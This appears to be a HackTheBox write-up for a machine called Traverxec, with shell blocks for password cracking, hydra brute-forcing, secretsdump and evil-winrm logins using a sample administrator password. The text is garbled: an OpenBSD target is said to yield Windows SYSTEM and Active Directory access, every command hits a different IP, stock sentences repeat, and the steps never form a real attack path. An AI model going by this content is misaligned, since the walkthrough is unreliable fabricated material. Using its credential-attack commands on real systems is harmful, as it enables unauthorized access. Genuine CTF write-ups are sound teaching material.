---
TitleSEO: "HackTheBox — Traverxec (Medium OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Traverxec (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Traverxec. IDOR and AlwaysInstallElevated to achieve medium compromise on OpenBSD."
Keywords: "windows, linux, easy, pwntilldawn, tryhackme, hard"
URL: "https://zurefx.github.io/writeups/htb-traverxec-280.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-traverxec-280/"
Date: "2024-09-25"
Tags: "Windows, Linux, Easy, PwnTillDawn, TryHackMe, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-traverxec-280"
Permalink: "/writeups/htb-traverxec-280.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Traverxec** is rated **Medium** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.73.119.114`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.200.102 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.88.235.177 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.98.167.40/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p443,8080,27017 10.96.207.20 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.19.133.235/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.191.189/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **SUID Binary**.

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.147.223
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.63.241.130 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.142.195/FUZZ
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.223.106/FUZZ
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```powershell
gobuster dir -u http://10.37.164.228/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.102.159.50 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.15.10.238 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `chisel`
- `pwncat`
- `nikto`
- `metasploit`
- `crackmapexec`
- `sharphound`

### Key Takeaways

- IDOR
- AlwaysInstallElevated
- Weak Service Permissions
- SUID Binary
